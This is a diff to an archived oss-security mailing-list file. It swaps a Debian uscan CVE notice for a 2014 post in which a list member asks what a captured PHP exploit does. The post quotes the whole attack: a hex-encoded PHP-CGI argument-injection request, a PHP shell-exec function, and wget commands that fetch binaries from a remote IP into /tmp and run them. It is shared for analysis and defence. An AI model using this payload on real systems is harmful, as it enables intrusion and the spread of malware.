@@ -1,32 +1,75 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/01/06/2
-Message-ID: <CAA7hUgFLwK1dNUyCd4FZMFF_jjjfWDqK5jn5Pb4aS6wA58vTsw@mail.gmail.com>
-Date: Mon, 6 Jan 2014 11:57:06 +0100
-From: Raphael Geissert <geissert@...ian.org>
-To: oss-security@...ts.openwall.com
-Cc: Ratul Gupta <ratulg@...hat.com>
-Subject: [notification] CVE-2013-6888: uscan: remote code execution
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/10/10/17
+Message-ID: <alpine.BSF.2.00.1410110621530.31844@aneurin.horsfall.org>
+Date: Sat, 11 Oct 2014 06:28:04 +1100 (EST)
+From: Dave Horsfall <dave@...sfall.org>
+To: OSS Security <oss-security@...ts.openwall.com>
+Subject: What does this PHP exploit do?
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+My apologies if this is off-topic for this list, but out of all the 
+security lists of which I am a member this seems to be the closest one 
+that fits, so please point me to a more appropriate one in that case..
 
-Given the recent issues in uscan (part of devscripts) I took a look at
-it and found a few other issues.
-The bugs fixed by the following commit basically allow remote code
-execution when uscan is used to download upstream's tarball. With and
-without repacking (contrary to the commit message).
+I'm trying to figure out what this exploit does; it started around the 
+time that Shellshock did, but I don't think that they're related.
 
-http://anonscm.debian.org/gitweb/?p=collab-maint/devscripts.git;a=commitdiff;h=02c6850d973e3e1246fde72edab27f03d63acc52
+It downloads binaries for several architectures (even a MIPS) which 
+amongst other things futzes around with IPTABLES (including blocking the 
+TELNET port) and appears to be self-reproducing.
 
-This was assigned CVE-2013-6888.
+The hex-encoded stuff in the script below decodes to 
 
-Two other changes were made that IMO should be considered as hardening:
-http://anonscm.debian.org/gitweb/?p=collab-maint/devscripts.git;a=commitdiff;h=4b7e58ee6000cdefac0682601cec6ecce0137467
-http://anonscm.debian.org/gitweb/?p=collab-maint/devscripts.git;a=commitdiff;h=b815aa438f018b5afc566eb403b0319a99a32995
+    "-d+allow_url_include=on+-d+safe_mode=off+-d+suhosin.simulation=on+-d+disable_functions=""+-d+open_basedir=none+-d+auto_prepend_file=php://input+-d+cgi.force_redirect=0+-d+cgi.redirect_status_env=0+-n" 
 
-At least I'm not aware of a way to exploit them.
+but my PHP-fu doesn't quite extend that far (and that "safe_mode=off" 
+looks a bit suss).
 
-Cheers,
--- 
-Raphael Geissert - Debian Developer
-www.debian.org - get.debian.net
+Script below, kindly supplied by 0wned boxes the world over (in this case, 
+Korea):
+
+POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1
+Host: xxx.xxx.xxx.xxx
+User-Agent: Mozilla/5.0 (compatible; Zollard; Linux)
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 1817
+Connection: close
+
+<?php
+echo "Zollard";
+$disablefunc = @ini_get("disable_functions");
+if (!empty($disablefunc))
+{
+ $disablefunc = str_replace(" ","",$disablefunc);
+ $disablefunc = explode(",",$disablefunc);
+}
+function myshellexec($cmd)
+{
+ global $disablefunc;
+ $result = "";
+ if (!empty($cmd))
+ {
+  if (is_callable("exec") and !in_array("exec",$disablefunc)) {exec($cmd,$result); $result = join("\n",$result);}
+  elseif (($result = `$cmd`) !== FALSE) {}
+  elseif (is_callable("system") and !in_array("system",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); system($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
+  elseif (is_callable("passthru") and !in_array("passthru",$disablefunc)) {$v = @ob_get_contents(); @ob_clean(); passthru($cmd); $result = @ob_get_contents(); @ob_clean(); echo $v;}
+  elseif (is_resource($fp = popen($cmd,"r")))
+  {
+   $result = "";
+   while(!feof($fp)) {$result .= fread($fp,1024);}
+   pclose($fp);
+  }
+ }
+ return $result;
+}
+myshellexec("rm -rf /tmp/armeabi;wget -P /tmp http://119.206.52.15:58455/armeabi;chmod +x /tmp/armeabi");
+myshellexec("rm -rf /tmp/arm;wget -P /tmp http://119.206.52.15:58455/arm;chmod +x /tmp/arm");
+myshellexec("rm -rf /tmp/ppc;wget -P /tmp http://119.206.52.15:58455/ppc;chmod +x /tmp/ppc");
+myshellexec("rm -rf /tmp/mips;wget -P /tmp http://119.206.52.15:58455/mips;chmod +x /tmp/mips");
+myshellexec("rm -rf /tmp/mipsel;wget -P /tmp http://119.206.52.15:58455/mipsel;chmod +x /tmp/mipsel");
+myshellexec("rm -rf /tmp/x86;wget -P /tmp http://119.206.52.15:58455/x86;chmod +x /tmp/x86");
+myshellexec("rm -rf /tmp/nodes;wget -P /tmp http://119.206.52.15:58455/nodes;chmod +x /tmp/nodes");
+myshellexec("rm -rf /tmp/sig;wget -P /tmp http://119.206.52.15:58455/sig;chmod +x /tmp/sig");
+myshellexec("/tmp/armeabi;/tmp/arm;/tmp/ppc;/tmp/mips;/tmp/mipsel;/tmp/x86;");
+
+-- Dave
